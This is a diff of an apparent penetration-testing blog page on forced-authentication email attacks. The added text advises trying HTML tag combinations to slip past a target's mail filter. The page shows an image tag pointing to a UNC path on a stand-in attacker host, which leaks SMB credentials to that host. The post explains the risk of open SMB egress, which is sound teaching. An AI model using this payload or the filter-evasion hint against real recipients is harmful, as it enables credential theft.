@@ -60,7 +60,7 @@
                 <h2>Forced Authentication Email Attacks</h2>
                 <p>The most common way we exploit forced authentication paths as penetration testers is via email. This is not a phishing attack and there is no pass/fail from the user's perspective. When this works, the failure sits squarely with improperly configured egress controls that allow SMB traffic to reach the public internet. When should SMB be allowed outbound to the internet? NEVER.</p>
 
-                <p>The attack itself is simple: a HTML email contains a embedded reference to a image hosted on an attacker-controlled server. There are many iterations of this but the most basic version is of an image tag pointing to a UNC path:</p>
+                <p>The attack itself is simple: a HTML email contains a embedded reference to a image hosted on an attacker-controlled server. There are many iterations of this, and if you're looking to emulate this in a production environment you'll likely need to play with some different HTML tag combinations to find ones that bypass your target's mail filter. I won't give away all of the secret sauce here, but the most basic version is of an image tag pointing to a UNC path:</p>
 
                 <pre><code>&lt;img src="\\attacker-host\logo.png"&gt;</code></pre>
 
